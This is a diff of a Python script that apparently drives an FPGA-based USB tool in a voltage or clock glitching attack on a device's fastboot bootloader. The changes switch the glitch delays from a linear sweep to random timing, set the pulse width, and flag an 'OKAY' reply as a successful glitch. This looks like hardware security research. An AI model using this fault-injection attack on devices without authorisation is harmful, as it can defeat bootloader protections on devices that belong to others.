@@ -7,7 +7,7 @@ phy = pw.Usb()
 phy.con(program_fpga=True)
 
 buttonState = 0
-
+PULSEWIDTH = 53
 
 def togglePin(in_bit):
   global buttonState
@@ -56,19 +56,20 @@ packetPrinter = pw.USBSimplePrintSink(highspeed=False)
 c = None
 doResetAll = True
 import random
-glitchCtr = 15.0
-while glitchCtr <= 18.0:
-  glitchCtr += 0.01
+
+delay_time = 16.5
+glitchCtr = 0
+while glitchCtr <= 200:
+  glitchCtr += 1
   ret = ""
+  delay_time = random.uniform(15.0,17.0)
   if doResetAll:
-    print("[%f] Resetting FPGA state" % glitchCtr)
+    print("[%f] Resetting FPGA state" % delay_time)
     resetFPGA()
-  print("[%f] Entering (fast) attempt" % glitchCtr)
+  print("[%f] Entering attempt %d" % (delay_time,glitchCtr))
   phy.set_pattern(capturemask,mask=[0xFF for c in capturemask])
-  delay_time = glitchCtr
   us_delay = phy.us_trigger(delay_time)
-  print("[%f] Using delay is %f" % (glitchCtr,delay_time))
-  print("[%f] Resetting device and trying again" % glitchCtr)
+  print("[%f] Resetting device and trying again" % delay_time)
   phy.set_usb_mode(mode="HS")
   if doResetAll:
     enterFastboot()
@@ -80,22 +81,23 @@ while glitchCtr <= 18.0:
     print("Entering fast glitch cycle...")
     phy.set_capture_size(512)
     phy.set_pattern(capturemask,mask=[0xFF for c in capturemask])
-    phy.set_trigger(enable=True,delays=[us_delay],widths=[phy.ns_trigger(55)])
+    phy.set_trigger(enable=True,delays=[us_delay],widths=[phy.ns_trigger(PULSEWIDTH)])
     phy.arm()
+    time.sleep(0.25)
     ret = c.bulkTransfer()
     doResetAll = False
-    time.sleep(1.0)
+    time.sleep(1.5)
   except Exception as e:
     print(e)
     doResetAll = True
-    print("[%f] GREPTHIS Hard powering off device (exception)" % glitchCtr)
+    print("[%f] GREPTHIS Hard powering off device (exception)" % delay_time)
     phy.set_power_source("off")
     togglePin(3) # PIN_FET
     time.sleep(1.0)
     continue
   if ret is False:
     doResetAll = True
-    print("[%f] Needs a reset" % glitchCtr)
+    print("[%f] Needs a reset" % delay_time)
   if ret != False:
     if "OKAY" in ret:
       input("Got a successful glitch, waiting for user input...")
@@ -107,7 +109,7 @@ while glitchCtr <= 18.0:
     #     continue
     #   packetPrinter.handle_usb_packet(ts=packet["timestamp"],buf=bytearray(packet["contents"]),flags=0)
   if doResetAll:
-    print("[%f] Hard powering off device" % glitchCtr)
+    print("[%f] Hard powering off device" % delay_time)
     phy.set_power_source("off")
     togglePin(3) # PIN_FET
     time.sleep(1.0)
